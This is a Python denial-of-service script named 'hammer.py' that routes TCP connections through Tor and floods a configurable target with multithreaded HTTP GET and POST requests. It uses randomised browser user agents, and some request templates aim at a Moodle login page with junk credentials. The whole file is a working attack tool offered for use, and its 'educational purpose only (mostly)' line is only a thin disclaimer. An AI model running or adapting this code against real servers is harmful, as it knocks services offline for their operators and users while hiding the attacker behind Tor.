#!/usr/bin/env python3
# hammer.py
# Made For FUN :)
# Simple script to perform DOS attack on 'target ip/hostname' using ipv4 tcp connections over tor network.
# Educational purpose only(mostly)!
# Change number of threads for heavier attacks (1-500)
# ** Global configs:
#       SET TARGET, TARGET_PORT and TARGET_HOST variables based on your target, also set tor listening port (TOR_PORT)
# ***** DOES NOT WORK WITHOUT TOR *****
import logging
import os
import random
import socket
import string
import sys
import threading
import time
from configs import *

import socks

################################################## Global Configs ##################################################
THREADS = 1

TARGET, TARGET_PORT, TARGET_HOST = '1.2.3.4', 80, 'example.com'


ENCODING = 'utf-8'
logging.basicConfig(format="[%(asctime)s]  %(levelname)s - %(message)s", datefmt="%H:%M:%S", level=logging.INFO)

DEBUG_RECV_MSG = False
####################################################################################################################

# Setting the socket to use, tor service listening on port `TOR_PORT`, as proxy
# This is done by monkey patching socket.socket
socks.set_default_proxy(socks.SOCKS5, TOR_HOST, TOR_PORT)
socket.socket = socks.socksocket
# socket.setdefaulttimeout(4)

user_agents = [
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36 OPR/51.0.2830.55",
    "Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML,like Gecko) Version/5.0.4 Safari/533",
    "Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.0; Windows NT 6.0; Trident/5.0)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/601.5.17 (KHTML, like Gecko) Version/9.1 Safari/601.5.17",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.0.54 (like Safari/604.1)",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4085.6 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.136 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 12371.75.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.105 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700M Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
    "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:64.0) Gecko/20100101 Firefox/64.0",
    "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4062.3 Safari/537.36 OPR/69.0.3623.0 (Edition developer)",
    "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 OPR/67.0.3575.79",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows 95; PalmSource; Blazer 3.0) 16; 160x160"

]
messages = ["""|  |______________| |______________ |
| _____ |   | ___ | ___ ___ | |   | |
| |   | |_| |__ | |_| __|____ | | | |
| | | |_________|__ |______ |___|_| |
| |_|   | _______ |______ |   | ____|
| ___ | |____ | DuckYou | |_| |____ |
|___|_|____ | |   ___ |  |_______ | |
|   ________| | |__ | |______ | | | |
| | | ________| | __|____ | | | __| |
|_| |__ |   | __|__ | ____| | |_| __|
|  _____|_|_|_____| |___|___|___|__ |""", """
       .-""""-.        .-""""-.
      /        \      /        \\
     /_        _\    /_        _\\
    // \      / \\\\  // \      / \\\\
    |\__\    /__/|  |\__\    /__/|
     \    ||    /    \    ||    /
      \        /      \        /
       \  __  /        \  __  /
        '.__.'          '.__.'
         |  |            |  |
         |  |            |  |\r\n\r\n""",
            "//////////////////////////////////////////////////////////////////////////////////////////"]

selected_message = 2  # 0 is the maze, 1 aliens, 2 forward-slash
splitted_message = list(messages[selected_message].split('\n'))

total_sent = 0
message_current_line = 0
sockets = []


def get_lm():
    return f"""GET /login/index.php HTTP/1.1\r
Host: {HOSTNAME}\r
User-Agent: {random.choice(user_agents)}\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Accept-Language: en-US,en;q=0.5\r
Accept-Encoding: gzip, deflate\r
Connection: keep-alive\r
Upgrade-Insecure-Requests: 1\r
Pragma: no-cache\r
Cache-Control: no-cache\r
\r\n"""


def post_lm(payload="logintoken=ASxkiwikiwikiwihahaKiwi"):
    contentLength = str(len(payload))
    # print(contentLength); time.sleep(100)
    header = f"""POST /login/index.php HTTP/1.1\r
Host: {HOSTNAME}\r
User-Agent: {random.choice(user_agents)}\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Accept-Language: en-US,en;q=0.5\r
Accept-Encoding: gzip, deflate\r
Referer: http://{HOSTNAME}/login/index.php\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {contentLength}\r
Connection: keep-alive\r
Cookie: MoodleSession=at97gmdo7h6qhvg34redocalff; SERVERID=s{random.choice([1, 4])}\r
Upgrade-Insecure-Requests: 1\r
\r\n"""

    request = header + payload + "\r\n"
    return request


def randomString(string_length=13):
    """Generates random string of given length for post payload"""
    password_characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(password_characters) for _ in range(string_length))


def get(which):
    """General http GET methods for nginx and apache2 and probably other webservers"""
    which = which.lower()
    global message_current_line
    if which == 'nginx':  # login/index.php
        request = f"""GET / HTTP/1.1\r
Host: {TARGET_HOST}\r
User-Agent: {random.choice(user_agents)}\r
Accept-language: en-US\r
Connection: keep-alive\r
Cache-Control: no-cache\r
Private-Message: {messages[selected_message]}\r
\r\n"""  # Pragma: no-cache\r
        # Cache-Control: max-age=0\r
    elif which == 'apache2':
        request = f"""GET / HTTP/1.1\r
Host: {TARGET_HOST}\r
User-Agent: {random.choice(user_agents)}\r
Accept-Language: en-US,en;q=0.5\r
Accept-Encoding: gzip, deflate\r
Connection: keep-alive\r
Upgrade-Insecure-Requests: 1\r
Cache-Control: max-age=0\r
Cache-Control: no-cache\r
\r\n"""

    else:  # non
        return False

    return request


def post(body="username=00222222222337876123&pass=0x81F87CB123AF8F8F8F09DF8F8F\r\n"):
    """General http POST method"""
    header = (f"""POST / HTTP/1.1\r
Host: {TARGET_HOST}\r
User-Agent: {random.choice(user_agents)}\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Accept-Language: en-US,en;q=0.5\r
Accept-Encoding: gzip, deflate\r
Referer: https://google.com\r
Connection: keep-alive\r
Content-Type: application/x-www-form-urlencoded\r\n""")

    contentLength = "Content-Length: " + str(len(body)) + "\r\n\r\n"
    request = header + contentLength + body
    return request


Exit_Flag = False


def init_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET, TARGET_PORT))
    s.settimeout(10)

    return s


def send():
    while True:
        if Exit_Flag:
            logging.info("Thread Stopped!")
            break
        global message_current_line, total_sent
        s = init_socket()
        # sockets.append(s)
        # s.sendto(message.encode(ENCODING), (target, port))
        # s.send(messageSplit[line].encode(ENCODING))
        # s.sendall(message[message_NO].encode(ENCODING))

        # nginx
        s.sendall(post().encode(ENCODING))
        # s.sendall(get('nginx').encode(ENCODING))
        # s.sendall(getlms2().encode(ENCODING))
        # s.sendall(postlms2(payload=f"logintoken={randomString(32)}&anchor=&username=ik{randomString(8)}"
        #                            f"&password={randomString(1000)}").encode(ENCODING))

        # apache2
        # s.sendall(post().encode(ENCODING))  # POST
        # s.sendall(get('apache2').encode(ENCODING))

        # Checking Website's response
        if DEBUG_RECV_MSG:
            BREAK_TIME = 0
            full_msg = ""
            # msg = s.recv(1024).decode(ENCODING, errors='ignore')
            # print(msg)
            # full_msg += msg
            # splitted = msg.split('\n')
            #
            # msg_len_hex = splitted[splitted.index("<!DOCTYPE html>") - 1]
            # msg_len = int("0x" + msg_len_hex, 0)

            msg_len = 1024
            while True:
                try:
                    full_msg += s.recv(msg_len).decode(ENCODING, errors='ignore')
                    if "237\n<!DOCTYPE html>" in full_msg:  # if redirect happened
                        break

                    print(f"{msg_len}B recved", end="\t\t")
                    BREAK_TIME += 1

                except Exception as e:
                    print(f"Execption in receiving message{e}")
                    break
                if "</html>" in full_msg or BREAK_TIME == 1000:
                    print(full_msg, f"\n\n{BREAK_TIME}")
                    # time.sleep(5)
                    break

        total_sent += 1

        # message_current_line += 1
        # if message_current_line == len(splitted_message):
        #     message_current_line = 0

        logging.info(f"ActiveThreads= {threading.active_count() - 1} || Total Sent: {total_sent:<10}")

        # Rest for some time and reconnect
        time.sleep(10)

    # never reaches here but just in case you wanted to close the connection properly break the previous while loop.
    s.close()


if __name__ == "__main__":
    try:
        print(f"\nReady to make love with {TARGET} on port {TARGET_PORT} with {THREADS} thread(s) at a time.")
        # input("press ENTER to START.\n")
        os.system("clear")
        print("Starting...", "Press CTRL+C to STOP!")
        for t in range(3, 0, -1):
            print(f"\r{t}", end="")
            time.sleep(1.5)
        for i in range(THREADS):
            thread = threading.Thread(target=send)
            thread.start()

        while True:
            logging.info(f"\t{os.system('ss -s | head -n2 | tail -n1')}")
            time.sleep(10)

    except KeyboardInterrupt:
        print("Safely Stopping...")
        Exit_Flag = True
        sys.exit(0)
